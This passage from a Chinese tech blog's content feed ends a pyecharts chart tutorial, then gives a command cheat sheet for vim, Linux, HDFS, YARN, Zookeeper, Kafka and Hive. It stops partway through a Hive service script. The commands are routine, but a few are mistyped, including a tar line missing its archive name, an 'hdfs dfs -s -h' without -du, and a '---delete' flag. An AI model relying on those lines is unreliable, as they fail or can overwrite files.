<span class="comment"># 修改图例icon</span></span><br><span class="line">        textstyle_opts=opts.TextStyleOpts(</span><br><span class="line">            color=<span class="string">&#x27;red&#x27;</span>,  <span class="comment"># 颜色</span></span><br><span class="line">            font_size=<span class="string">&#x27;12&#x27;</span>,   <span class="comment"># 字体大小</span></span><br><span class="line">            font_weight=<span class="string">&#x27;bolder&#x27;</span>,   <span class="comment"># 加粗</span></span><br><span class="line">        )  <span class="comment"># 文本样式配置</span></span><br><span class="line">        ),</span><br><span class="line">  </span><br><span class="line">    title_opts=opts.TitleOpts(</span><br><span class="line">        title=<span class="string">&quot;居中标题&quot;</span>,   <span class="comment"># 主标题内容</span></span><br><span class="line">        <span class="comment"># subtitle=&#x27;我是副标题，稍微长一点再长一点【点我也会跳转】&#x27;,  # 副标题内容</span></span><br><span class="line">        <span class="comment"># </span></span><br><span class="line">        title_target=<span class="string">&#x27;blank&#x27;</span>,  <span class="comment"># 新建窗口打开链接</span></span><br><span class="line">        title_link=<span class="string">&#x27;http://www.baidu.com&#x27;</span>,  <span class="comment"># 主标题链接</span></span><br><span class="line">        subtitle_link=<span class="string">&#x27;http://www.heywale.com&#x27;</span>,  <span class="comment"># 副标题链接</span></span><br><span class="line">        subtitle_target=<span class="string">&#x27;self&#x27;</span>,  <span class="comment"># 当前窗口打开</span></span><br><span class="line">        pos_left=<span class="string">&#x27;center&#x27;</span>,  <span class="comment"># 距离左边界距离，center表示剧中</span></span><br><span class="line">        pos_top=<span class="string">&#x27;5%&#x27;</span>,  <span class="comment"># 距离上边界距离</span></span><br><span class="line">        item_gap=<span class="number">20</span>,  <span class="comment"># 主副标题之间距离</span></span><br><span class="line">        title_textstyle_opts=opts.TextStyleOpts(color=<span class="string">&quot;white&quot;</span>,         <span class="comment"># 主标题颜色</span></span><br><span class="line">        font_size=<span class="number">20</span></span><br><span class="line">        ,font_weight=<span class="string">&quot;bold&quot;</span>  <span class="comment"># 字体加粗&quot;</span></span><br><span class="line">         )</span><br><span class="line">        ),</span><br><span class="line">         datazoom_opts=opts.DataZoomOpts(</span><br><span class="line">        range_start=<span class="number">0</span>,  <span class="comment"># 开始范围</span></span><br><span class="line">        range_end=<span class="number">50</span>,  <span class="comment"># 结束范围</span></span><br><span class="line">        <span class="comment"># orient=&#x27;vertical&#x27;,  # 设置为垂直布局</span></span><br><span class="line">        type_=<span class="string">&#x27;slider&#x27;</span>,  <span class="comment"># slider形式</span></span><br><span class="line">        is_zoom_lock=<span class="literal">True</span>,  <span class="comment"># 锁定区域大小</span></span><br><span class="line">        pos_left=<span class="string">&#x27;1%&#x27;</span>  <span class="comment"># 设置位置</span></span><br><span class="line">        ),</span><br><span class="line">       </span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为chart添加x轴的数据</span></span><br><span class="line">chart.add_xaxis(x_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为chart添加y轴的数据</span></span><br><span class="line">chart.add_yaxis(<span class="string">&#x27;系列一&#x27;</span>, y_data_1,linestyle_opts=opts.LineStyleOpts(color=<span class="string">&quot;red&quot;</span>, width=<span class="number">4</span>, type_=<span class="string">&quot;dotted&quot;</span>),areastyle_opts=opts.AreaStyleOpts(opacity=<span class="number">0.6</span>))</span><br><span class="line">chart.add_yaxis(<span class="string">&#x27;系列二&#x27;</span>, y_data_2,linestyle_opts=opts.LineStyleOpts(color=<span class="string">&quot;pink&quot;</span>, width=<span class="number">4</span>, type_=<span class="string">&quot;dotted&quot;</span>),areastyle_opts=opts.AreaStyleOpts(opacity=<span class="number">0.3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在noteboo中夹在图表</span></span><br><span class="line"><span class="comment"># 如果是在Pycharm等IDE中 使用charts.render(&quot;xxx.html&quot;)</span></span><br><span class="line">chart.render_notebook()</span><br></pre></td></tr></table></figure><p><img src="http://106.12.125.218/medias/medias/%E5%92%8C%E9%B2%B8%E8%AE%AD%E7%BB%83%E8%90%A5-%E5%95%86%E4%B8%9A%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96/0.png"></p>]]></content>
      
      
      <categories>
          
          <category> DataAnalysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pyecharts </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据框架命令(纯净版)</title>
      <link href="/2021/11/28/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%A1%86%E6%9E%B6%E5%91%BD%E4%BB%A4(%E7%BA%AF%E5%87%80%E7%89%88)/"/>
      <url>/2021/11/28/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%A1%86%E6%9E%B6%E5%91%BD%E4%BB%A4(%E7%BA%AF%E5%87%80%E7%89%88)/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux（vi-vim）"><a href="#Linux（vi-vim）" class="headerlink" title="Linux（vi/vim）"></a>Linux（vi/vim）</h2><h3 id="一般模式"><a href="#一般模式" class="headerlink" title="一般模式"></a>一般模式</h3><table><thead><tr><th>语法</th><th>功能描述</th></tr></thead><tbody><tr><td>yy</td><td>复制光标当前一行</td></tr><tr><td>y数字y</td><td>复制一段（从第几行到第几行）</td></tr><tr><td>p</td><td>箭头移动到目的行粘贴</td></tr><tr><td>u</td><td>撤销上一步</td></tr><tr><td>dd</td><td>删除光标当前行</td></tr><tr><td>d数字d</td><td>删除光标（含）后多少行</td></tr><tr><td>x</td><td>删除一个字母，相当于del</td></tr><tr><td>X</td><td>删除一个字母，相当于Backspace</td></tr><tr><td>yw</td><td>复制一个词</td></tr><tr><td>dw</td><td>删除一个词</td></tr><tr><td>shift+^</td><td>移动到行头</td></tr><tr><td>shift+$</td><td>移动到行尾</td></tr><tr><td>1+shift+g</td><td>移动到页头，数字</td></tr><tr><td>shift+g</td><td>移动到页尾</td></tr><tr><td>数字N+shift+g</td><td>移动到目标行</td></tr></tbody></table><h3 id="编辑模式"><a href="#编辑模式" class="headerlink" title="编辑模式"></a>编辑模式</h3><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>i</td><td>当前光标前</td></tr><tr><td>a</td><td>当前光标后</td></tr><tr><td>o</td><td>当前光标行的下一行</td></tr><tr><td>I</td><td>光标所在行最前</td></tr><tr><td>A</td><td>光标所在行最后</td></tr><tr><td>O</td><td>当前光标行的上一行</td></tr></tbody></table><h3 id="指令模式"><a href="#指令模式" class="headerlink" title="指令模式"></a>指令模式</h3><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>:w</td><td>保存</td></tr><tr><td>:q</td><td>退出</td></tr><tr><td>:!</td><td>强制执行</td></tr><tr><td>/要查找的词</td><td>n 查找下一个，N 往上查找</td></tr><tr><td>? 要查找的词</td><td>n是查找上一个，shift+n是往下查找</td></tr><tr><td>:set nu</td><td>显示行号</td></tr><tr><td>:set nonu</td><td>关闭行号</td></tr></tbody></table><h3 id="压缩和解压"><a href="#压缩和解压" class="headerlink" title="压缩和解压"></a>压缩和解压</h3><h4 id="gzip-gunzip-压缩"><a href="#gzip-gunzip-压缩" class="headerlink" title="gzip/gunzip 压缩"></a>gzip/gunzip 压缩</h4><p>（1）只能压缩文件不能压缩目录</p><p>（2）不保留原来的文件</p><p>gzip压缩：gzip hello.txt</p><p>gunzip解压缩文件：gunzip hello.txt.gz</p><h4 id="zip-unzip-压缩"><a href="#zip-unzip-压缩" class="headerlink" title="zip/unzip 压缩"></a>zip/unzip 压缩</h4><p>可以压缩目录且保留源文件</p><p>zip压缩（压缩 1.txt 和2.txt，压缩后的名称为mypackage.zip）：zip hello.zip hello.txt world.txt</p><p>unzip解压：unzip hello.zip</p><p>unzip解压到指定目录：unzip hello.zip -d /opt</p><h4 id="tar-打包"><a href="#tar-打包" class="headerlink" title="tar 打包"></a>tar 打包</h4><p>tar压缩多个文件：tar -zcvf hello.txt world.txt</p><p>tar压缩目录：tar -zcvf hello.tar.gz opt/</p><p>tar解压到当前目录：tar -zxvf hello.tar.gz</p><p>tar解压到指定目录：tar -zxvf hello.tar.gz -C /opt</p><h3 id="RPM"><a href="#RPM" class="headerlink" title="RPM"></a>RPM</h3><p>RPM查询命令：rpm -qa |grep firefox</p><p>RPM卸载命令：</p><p>rpm -e xxxxxx</p><p>rpm -e –nodeps xxxxxx（不检查依赖）</p><p>RPM安装命令：</p><p>rpm -ivh xxxxxx.rpm</p><p>rpm -ivh –nodeps fxxxxxx.rpm（–nodeps，不检测依赖进度）</p><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>-i</td><td>-i=install，安装</td></tr><tr><td>-v</td><td>-v=verbose，显示详细信息</td></tr><tr><td>-h</td><td>-h=hash，进度条</td></tr><tr><td>–nodeps</td><td>–nodeps，不检测依赖进度</td></tr></tbody></table><hr><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><h3 id="输入-输出重定向"><a href="#输入-输出重定向" class="headerlink" title="输入/输出重定向"></a>输入/输出重定向</h3><table><thead><tr><th>命令</th><th>功能说明</th></tr></thead><tbody><tr><td>command &gt; file</td><td>将输出重定向到 file</td></tr><tr><td>command &lt; file</td><td>将输入重定向到 file</td></tr><tr><td>command &gt;&gt; file</td><td>将输出以追加的方式重定向到 file</td></tr><tr><td>n &gt; file</td><td>将文件描述符为 n 的文件重定向到 file</td></tr><tr><td>n &gt;&gt; file</td><td>将文件描述符为 n 的文件以追加的方式重定向到 file</td></tr><tr><td>n &gt;&amp; m</td><td>将输出文件 m 和 n 合并</td></tr><tr><td>n &lt;&amp; m</td><td>将输入文件 m 和 n 合并</td></tr><tr><td>&lt;&lt; tag</td><td>将开始标记 tag 和结束标记 tag 之间的内容作为输入</td></tr></tbody></table><h3 id="脚本编辑"><a href="#脚本编辑" class="headerlink" title="脚本编辑"></a>脚本编辑</h3><table><thead><tr><th>快捷方式</th><th>功能说明</th></tr></thead><tbody><tr><td>shift</td><td>参数左移</td></tr><tr><td>$@</td><td>所有的参数</td></tr><tr><td>$#</td><td>参数的个数</td></tr></tbody></table><hr><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2><h3 id="启动类命令"><a href="#启动类命令" class="headerlink" title="启动类命令"></a>启动类命令</h3><table><thead><tr><th>功能说明</th><th>命令脚本</th></tr></thead><tbody><tr><td>启动hdfs集群</td><td>sbin/start-dfs.sh</td></tr><tr><td>启动yarn</td><td>sbin/start-yarn.sh</td></tr></tbody></table><h3 id="hadoop-fs-hdfs-dfs-命令"><a href="#hadoop-fs-hdfs-dfs-命令" class="headerlink" title="hadoop fs/hdfs dfs 命令"></a>hadoop fs/hdfs dfs 命令</h3><table><thead><tr><th>功能说明</th><th>命令</th></tr></thead><tbody><tr><td>创建目录</td><td>hdfs dfs -mkdir -p /data/flink</td></tr><tr><td>显示目录</td><td>hdfs dfs -ls /</td></tr><tr><td>从HDFS拷贝到本地</td><td>hdfs dfs -copyToLocal /data/data.txt ./</td></tr><tr><td>文件上传到集群(从本地)</td><td>hhdfs dfs -copyFromLocal data.txt /</td></tr><tr><td>文件下载</td><td>hdfs dfs -get /data/flink</td></tr><tr><td>删除集群的文件</td><td>hdfs dfs -rm /data/flink</td></tr><tr><td>删除文件夹</td><td>hdfs dfs -rm -r -skipTrash /data</td></tr><tr><td>从本地剪切粘贴到HDFS</td><td>hdfs dfs  -moveFromLocal data.txt /data/</td></tr><tr><td>追加一个文件到已经存在的文件末尾hdfs dfs -appendToFile data1.txt /data/data.txt</td><td></td></tr><tr><td>显示文件内容</td><td>hdfs dfs -cat data.txt</td></tr><tr><td>修改文件所属权限</td><td>hdfs dfs  -chmod  777 xxx.sh</td></tr><tr><td>修改文件所属用户组</td><td>hdfs dfs  -chown  root:root data.txt</td></tr><tr><td>从HDFS的一个路径拷贝到HDFS的另一个路径</td><td>hdfs dfs -cp data.txt /data1.txt</td></tr><tr><td>在HDFS目录中移动文件</td><td>hdfs dfs -mv data.txt /opt/</td></tr><tr><td>合并下载多个文件</td><td>hdfs dfs  -getmerge /data/* ./data_merge.txt</td></tr><tr><td>hadoop fs -put</td><td>等同于copyFromLocal</td></tr><tr><td>显示一个文件的末尾</td><td>hdfs dfs -tail data.txt</td></tr><tr><td>删除文件或文件夹</td><td>hdfs dfs -rm /data/data.txt</td></tr><tr><td>删除空目录</td><td>hdfs dfs -rmdir /data</td></tr><tr><td>统计文件夹的大小信息</td><td>hdfs dfs -s -h /data</td></tr><tr><td>统计文件夹下的文件大小信息</td><td>hdfs dfs  -h /data</td></tr><tr><td>设置HDFS中文件的副本数量</td><td>hdfs dfs -setrep 3 /data/data.txt</td></tr></tbody></table><h3 id="yarn命令"><a href="#yarn命令" class="headerlink" title="yarn命令"></a>yarn命令</h3><table><thead><tr><th>功能说明</th><th>命令</th></tr></thead><tbody><tr><td>查看正在运行的yarn任务列表</td><td>yarn application -list appID</td></tr><tr><td>kill掉指定id的yarn任务</td><td>yarn application -kill appID</td></tr><tr><td>查看任务日志信息</td><td>yarn logs -applicationId appID</td></tr></tbody></table><hr><h2 id="Zookeeper"><a href="#Zookeeper" class="headerlink" title="Zookeeper"></a>Zookeeper</h2><h3 id="启动命令"><a href="#启动命令" class="headerlink" title="启动命令"></a>启动命令</h3><table><thead><tr><th>功能说明</th><th>命令脚本</th></tr></thead><tbody><tr><td>启动zookeeper服务</td><td>zkServer.sh start</td></tr><tr><td>查看zookeeper状态</td><td>zkServer.sh status</td></tr><tr><td>停止zookeeper服务</td><td>zkServer.sh stop</td></tr><tr><td>启动zookeeper客户端</td><td>zkCli.sh -server 127.0.0.1:2181</td></tr><tr><td>退出zookeeper客户端</td><td>quit</td></tr></tbody></table><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><table><thead><tr><th>功能说明</th><th>命令脚本</th></tr></thead><tbody><tr><td>当前znode中所包含的内容</td><td>ls /</td></tr><tr><td>创建普通节点(前面是节点的路径，后面是值）</td><td>create /bigdata/flink “flink”</td></tr><tr><td>获取节点的值</td><td>get /bigdata</td></tr><tr><td>修改节点的值</td><td>set /bigdata/flink “flinksql”</td></tr><tr><td>删除节点</td><td>delete /bigdata/flink</td></tr><tr><td>递归删除节点</td><td>rmr /bigdata</td></tr></tbody></table><h3 id="四字母命令"><a href="#四字母命令" class="headerlink" title="四字母命令"></a>四字母命令</h3><table><thead><tr><th>命令</th><th>功能说明</th><th>例子</th></tr></thead><tbody><tr><td>conf</td><td>zk服务配置的详细信息</td><td>echo conf</td></tr><tr><td>stat</td><td>客户端与zk连接的简要信息</td><td>参考上面</td></tr><tr><td>srvr</td><td>zk服务的详细信息</td><td>参考上面</td></tr><tr><td>cons</td><td>客户端与zk连接的详细信息</td><td>参考上面</td></tr><tr><td>mntr</td><td>zk服务目前的性能状况</td><td>参考上面</td></tr><tr><td>crst</td><td>重置当前的所有连接、会话</td><td>参考上面</td></tr><tr><td>dump</td><td>列出未经处理的会话和连接信息</td><td>参考上面</td></tr><tr><td>envi</td><td>列出zk的版本信息、主机名称、Java版本、服务器名称等等</td><td>参考上面</td></tr><tr><td>ruok</td><td>测试服务器是否正在运行，如果在运行返回imok，否则返回空</td><td>参考上面</td></tr><tr><td>srst</td><td>重置Zookeeper的所有统计信息</td><td>参考上面</td></tr><tr><td>wchs</td><td>列出watch的总数，连接数</td><td>参考上面</td></tr><tr><td>wchp</td><td>列出所有watch的路径及sessionID</td><td>参考上面</td></tr><tr><td>mntr</td><td>列出集群的关键性能数据，包括zk的版本、node数量、临时节点数等等</td><td>参考上面</td></tr></tbody></table><hr><h2 id="Kafka"><a href="#Kafka" class="headerlink" title="Kafka"></a>Kafka</h2><p><strong>注:</strong> 这里机器我只写一个。命令你们也可使用 ./bin/xx.sh (如：./bin/kafka-topics.sh)</p><h3 id="查看当前服务器中的所有topic"><a href="#查看当前服务器中的所有topic" class="headerlink" title="查看当前服务器中的所有topic"></a>查看当前服务器中的所有topic</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181 --list --exclude-internal </span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line"></span><br><span class="line">exclude-internal：排除kafka内部topic</span><br><span class="line"></span><br><span class="line">比如： --exclude-internal  --topic &quot;test_.*&quot;</span><br></pre></td></tr></table></figure><h3 id="创建topic"><a href="#创建topic" class="headerlink" title="创建topic"></a>创建topic</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181  --create </span><br><span class="line">--replication-factor </span><br><span class="line">--partitions 1 </span><br><span class="line">--topic topic_name</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line"></span><br><span class="line">--topic 定义topic名</span><br><span class="line"></span><br><span class="line">--replication-factor  定义副本数</span><br><span class="line"></span><br><span class="line">--partitions  定义分区数</span><br></pre></td></tr></table></figure><h3 id="删除topic"><a href="#删除topic" class="headerlink" title="删除topic"></a>删除topic</h3><p><strong>注意:</strong> 需要server.properties中设置delete.topic.enable=true否则只是标记删除</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181 --delete --topic topic_name</span><br></pre></td></tr></table></figure><h3 id="生产者"><a href="#生产者" class="headerlink" title="生产者"></a>生产者</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-producer --broker-list xxxxxx:9092 --topic topic_name</span><br><span class="line"></span><br><span class="line">可加：--property parse.key=true（有key消息）</span><br></pre></td></tr></table></figure><h3 id="消费者"><a href="#消费者" class="headerlink" title="消费者"></a>消费者</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-consumer --bootstrap-server xxxxxx:9092 --topic topic_name</span><br><span class="line"></span><br><span class="line">注：可选</span><br><span class="line"></span><br><span class="line">--from-beginning：会把主题中以往所有的数据都读取出来</span><br><span class="line"></span><br><span class="line">--whitelist &#x27;.*&#x27; ：消费所有的topic</span><br><span class="line"></span><br><span class="line">--property print.key=true：显示key进行消费</span><br><span class="line"></span><br><span class="line">--partition 0：指定分区消费</span><br><span class="line"></span><br><span class="line">--offset：指定起始偏移量消费</span><br></pre></td></tr></table></figure><h3 id="查看某个Topic的详情"><a href="#查看某个Topic的详情" class="headerlink" title="查看某个Topic的详情"></a>查看某个Topic的详情</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181 --describe --topic topic_name</span><br></pre></td></tr></table></figure><h3 id="修改分区数"><a href="#修改分区数" class="headerlink" title="修改分区数"></a>修改分区数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --zookeeper xxxxxx:2181 --alter --topic topic_name --partitions 6</span><br></pre></td></tr></table></figure><h3 id="查看某个消费者组信息"><a href="#查看某个消费者组信息" class="headerlink" title="查看某个消费者组信息"></a>查看某个消费者组信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-consumer-groups --bootstrap-server  xxxxxx:9092  --describe --group group_name</span><br></pre></td></tr></table></figure><h3 id="删除消费者组"><a href="#删除消费者组" class="headerlink" title="删除消费者组"></a>删除消费者组</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-consumer-groups --bootstrap-server  xxxxxx:9092  ---delete --group group_name</span><br></pre></td></tr></table></figure><h3 id="重置offset"><a href="#重置offset" class="headerlink" title="重置offset"></a>重置offset</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-consumer-groups --bootstrap-server  xxxxxx:9092  --group group_name</span><br><span class="line"></span><br><span class="line">--reset-offsets --all-topics --to-latest --execute</span><br></pre></td></tr></table></figure><h3 id="leader重新选举"><a href="#leader重新选举" class="headerlink" title="leader重新选举"></a>leader重新选举</h3><p>指定Topic指定分区用重新PREFERRED：优先副本策略 进行Leader重选举</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-leader-election --bootstrap-server xxxxxx:9092 </span><br><span class="line">--topic topic_name --election-type PREFERRED --partition 0</span><br></pre></td></tr></table></figure><p>所有Topic所有分区用重新PREFERRED：优先副本策略 进行Leader重选举</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-leader-election --bootstrap-server xxxxxx:9092 </span><br><span class="line">--election-type preferred  --all-topic-partitions</span><br></pre></td></tr></table></figure><h3 id="查询kafka版本信息"><a href="#查询kafka版本信息" class="headerlink" title="查询kafka版本信息"></a>查询kafka版本信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-configs --bootstrap-server xxxxxx:9092</span><br><span class="line">--describe --version</span><br></pre></td></tr></table></figure><h3 id="增删改配置"><a href="#增删改配置" class="headerlink" title="增删改配置"></a>增删改配置</h3><table><thead><tr><th>功能说明</th><th>参数</th></tr></thead><tbody><tr><td>选择类型</td><td>–entity-type (topics/clients/users/brokers/broker- loggers)</td></tr><tr><td>类型名称</td><td>–entity-name</td></tr><tr><td>删除配置</td><td>–delete-config k1=v1,k2=v2</td></tr><tr><td>添加/修改配置</td><td>–add-config k1,k2</td></tr></tbody></table><p>topic添加/修改动态配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-configs --bootstrap-server xxxxxx:9092</span><br><span class="line">--alter --entity-type topics --entity-name topic_name </span><br><span class="line">--add-config file.delete.delay.ms=222222,retention.ms=999999</span><br></pre></td></tr></table></figure><p>topic删除动态配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-configs --bootstrap-server xxxxxx:9092 </span><br><span class="line">--alter --entity-type topics --entity-name topic_name </span><br><span class="line">--delete-config file.delete.delay.ms,retention.ms</span><br></pre></td></tr></table></figure><h3 id="持续批量拉取消息"><a href="#持续批量拉取消息" class="headerlink" title="持续批量拉取消息"></a>持续批量拉取消息</h3><p>单次最大消费10条消息(不加参数意为持续消费)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-verifiable-consumer --bootstrap-server xxxxxx:9092 </span><br><span class="line">--group group_name</span><br><span class="line">--topic topic_name --max-messages 10</span><br></pre></td></tr></table></figure><h3 id="删除指定分区的消息"><a href="#删除指定分区的消息" class="headerlink" title="删除指定分区的消息"></a>删除指定分区的消息</h3><p>删除指定topic的某个分区的消息删除至offset为1024</p><p>json文件offset-json-file.json</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;partitions&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;topic&quot;: &quot;topic_name&quot;,</span><br><span class="line">            &quot;partition&quot;: 0,</span><br><span class="line">            &quot;offset&quot;: 1024</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;version&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-delete-records --bootstrap-server xxxxxx:9092 </span><br><span class="line">--offset-json-file offset-json-file.json</span><br></pre></td></tr></table></figure><h3 id="查看Broker磁盘信息"><a href="#查看Broker磁盘信息" class="headerlink" title="查看Broker磁盘信息"></a>查看Broker磁盘信息</h3><p>查询指定topic磁盘信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-log-dirs --bootstrap-server xxxxxx:9090 </span><br><span class="line">--describe --topic-list topic1,topic2</span><br></pre></td></tr></table></figure><p>查询指定Broker磁盘信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-log-dirs --bootstrap-server xxxxxx:9090 </span><br><span class="line">--describe --topic-list topic1 --broker-list 0</span><br></pre></td></tr></table></figure><h2 id="Hive"><a href="#Hive" class="headerlink" title="Hive"></a>Hive</h2><h3 id="启动类"><a href="#启动类" class="headerlink" title="启动类"></a>启动类</h3><table><thead><tr><th>功能说明</th><th>命令</th></tr></thead><tbody><tr><td>启动hiveserver2服务</td><td>bin/hiveserver2</td></tr><tr><td>启动beeline</td><td>bin/beeline</td></tr><tr><td>连接hiveserver2</td><td>beeline&gt; !connect jdbc:hive2://hadoop102:10000</td></tr><tr><td>metastroe服务</td><td>bin/hive –service metastore</td></tr></tbody></table><p>hive 启动元数据服务（metastore和hiveserver2）和优雅关闭脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">启动： hive.sh start</span><br><span class="line">关闭： hive.sh stop</span><br><span class="line">重启： hive.sh restart</span><br><span class="line">状态： hive.sh status</span><br></pre></td></tr></table></figure><p>脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">HIVE_LOG_DIR=$HIVE_HOME/logs</span><br><span class="line"></span><br><span class="line">mkdir -p $HIVE_LOG_DIR</span><br><span class="line"></span><br><span class="line">#检查进程是否运行正常，参数1为进程名，参数2为进程端口</span><br><span class="line">function check_process()</span><br><span class="line">&#123;</span><br><span class="line">    pid=$(ps -ef 2&gt;/dev/null | grep -v grep | grep -i $1 | awk &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">    ppid=$(netstat -nltp 2&gt;/dev/null | grep $2 | awk &#x27;&#123;print $7&#125;&#x27; | cut -d &#x27;/&#x27; -f 1)</span><br><span class="line">    echo $pid</span><br><span class="line">    [[ &quot;$pid&quot; =~ &quot;$ppid&quot; ]] &amp;&amp; [ &quot;$ppid&quot; ] &amp;&amp; return 0 || return 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hive_start()</span><br><span class="line">&#123;</span><br><span class="line">    metapid=$(check_process HiveMetastore 9083)</span><br><span class="line">    cmd=&quot;nohup hive --service metastore &gt;$HIVE_LOG_DIR/metastore.log 2&gt;&amp;1 &amp;&quot;</span><br><span class="line">    cmd=$cmd&quot; sleep4; hdfs dfsadmin -safemode wait &gt;/dev/null 2&gt;&amp;1&quot;</span><br><span class="line">    [ -z &quot;$metapid&quot; ] &amp;&amp; eval $cmd || echo &quot;Metastroe服务已启动&quot;</span><br><span class="line">    server2pid=$(check_process HiveServer2 10000)</span><br><span class="line">    cmd=&quot;nohup hive --service hiveserver2 &gt;$HIVE_LOG_DIR/hiveServer2.log 2&gt;&amp;1 &amp;&quot;</span><br><span class="line">    [ -z 